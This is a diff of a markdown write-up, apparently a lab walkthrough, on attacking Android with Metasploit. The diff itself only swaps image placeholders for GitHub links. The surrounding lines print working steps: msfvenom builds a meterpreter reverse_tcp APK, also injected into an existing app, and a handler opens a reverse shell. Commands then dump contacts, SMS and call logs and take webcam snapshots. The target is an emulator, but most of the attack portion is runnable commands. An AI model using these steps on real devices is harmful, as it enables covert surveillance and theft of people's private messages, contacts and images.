@@ -29,71 +29,71 @@ $ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 
 
 Install the apk generated on the target device(genymotion/android)
 
-!img
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.png)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/4.png)
 
 Go to ‘opt/metasploit-framework/bin’ and follow the steps to get the reverse shell
 
 $ ./msfconsole
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/5.png)
 
 $ use exploit/multi/handler
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/6.png)
 
 
 $ set payload android/meterpreter/reverse_tcp
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/7.png)
 
 $ show options
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/8.png)
 
 $ set LHOST <localhost ip>
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/9.png)
 
 $ exploit ‘or’ run
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/10.png)
 
 Click on the test.apk application in the remote target device(genymotion/android) to get the reverse shell
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/11.png)
 
 $ help ‘or’ ?
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/12.png)
 
 $ dump_contacts
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/13.png)
 
 $ dump_sms
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/14.png)
 
 $ dump_calllog
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/15.png)
 
 Go to the ‘metasploit-framework’ folder to get the dumps
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/16.png)
 
 $ cat <calllog.txt>
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/17.png)
 
 $ cat <contacts.txt>
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/18.png)
 
 $ cat <sms.txt>
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/19.png)
 
 Commands for webcam
 
@@ -101,9 +101,9 @@ $ webcam_list
 
 $ webcam_snap 1 ‘or’ 2
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/20.png)
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/21.png)
 
 2) Steps to inject reverse_tcp payload in an existing app(diva-beta.apk)
 
@@ -111,7 +111,7 @@ Go to ‘opt/metasploit-framework/bin’ and enter the following command
 
 $ ./msfvenom -x <apk path/apkname.apk> -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>
 
-!img
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/22.png)
 
 Install the app in the device and repeat the msfconsole steps as shown earlier to get the reverse shell.
 
